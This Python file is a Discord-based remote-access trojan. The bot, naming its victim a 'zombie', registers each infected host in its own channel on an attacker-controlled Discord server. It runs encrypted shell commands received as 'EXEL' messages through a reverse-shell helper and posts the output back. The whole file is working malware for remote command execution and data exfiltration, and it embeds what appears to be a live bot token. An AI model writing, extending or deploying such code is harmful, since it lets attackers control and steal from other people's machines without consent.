import discord
import requests
import socket
import pty
import os
from linuxshell import *

TOKEN = 'MTM4Nzc2MTAyNTQ0NDc0NTMyNw.Gw0Efj.gT5ntY7rGfascLfhLwhU7Kk-kVM1-bY1Ndww8U'
ZOMBIE_ID = "Target_1"
SERVER_ID = 1387775222370795570
GENERAL = 1387935717673537577
CHANNEL_TARGET = None

intents = discord.Intents.default()
intents.message_content = True
intents.guilds = True
intents.messages = True

client = discord.Client(intents=intents)
canal_zombie = None
hostname = socket.gethostname()

@client.event
async def on_ready():
    guild = discord.utils.get(client.guilds, id=SERVER_ID)
    channel_name = f"session-{hostname}"
    existing_channel = discord.utils.get(guild.text_channels, name=channel_name)
    global CHANNEL_TARGET

    if not existing_channel:
        new_channel =  await guild.create_text_channel(channel_name)
        CHANNEL_TARGET = new_channel.id
        await new_channel.send(f"Conectado {hostname}")
        await new_channel.send(f"REGISTER {hostname} {new_channel.id}")
    else:
        CHANNEL_TARGET = existing_channel.id
        await existing_channel.send(f"Conectado {hostname}")
        await existing_channel.send(f"REGISTER {hostname} {existing_channel.id}")


@client.event
async def on_message(message):
    
    if message.channel.id == CHANNEL_TARGET and "EXEL" in message.content:
        print(f"mensaje captado por cliente:{message.content}")
        comando_encriptado = message.content.strip("EXEL:")
        target_exec = Revshell_HTTPS_Recv(comando_encriptado)
        pkt_send_text = target_exec.pkt_exec()
        

        pkt_send_encrypt = Revshell_HTTPS_SEND(pkt_send_text.stdout).pkt_send()

        canal_target = client.get_channel(CHANNEL_TARGET)
        if canal_target:
            await canal_target.send(pkt_send_encrypt)

    else:
        return
        

client.run(TOKEN)
